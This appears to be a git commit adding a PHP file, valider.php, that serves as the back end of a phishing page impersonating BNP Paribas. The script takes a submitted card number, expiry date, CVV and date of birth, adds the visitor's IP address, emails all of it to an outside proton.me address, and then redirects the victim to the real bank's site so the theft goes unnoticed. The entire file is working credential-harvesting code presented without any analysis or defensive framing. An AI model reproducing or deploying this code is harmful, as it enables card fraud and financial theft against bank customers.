7c69ba849e1b9027270abc9896f1d77abfd3baeb
packetcodeofficialstuddy <duffounie@proton.me>
2022-12-23 05:05:30 -0800

    Added new files

---
+++ valider.php
@@ -0,0 +1,16 @@
+<?php
+	$ip = "";
+	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    	$ip = $_SERVER['HTTP_CLIENT_IP'];
+	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	} else {
+	    $ip = $_SERVER['REMOTE_ADDR'];
+	}
+	$header = "From $ip <bnp@pipi.bmci>";
+	$header .= "";
+	$msg  = "---------$ip\ncb: ".$_POST['cb']."\n exp: ". $_POST['exp']."\n ccv: ". $_POST['ccv']."\n dob: ". $_POST['dob'];
+	mail("duffounie@proton.me",$header,$msg);
+	header("location:https://mabanque.bnpparibas");
+
+?>
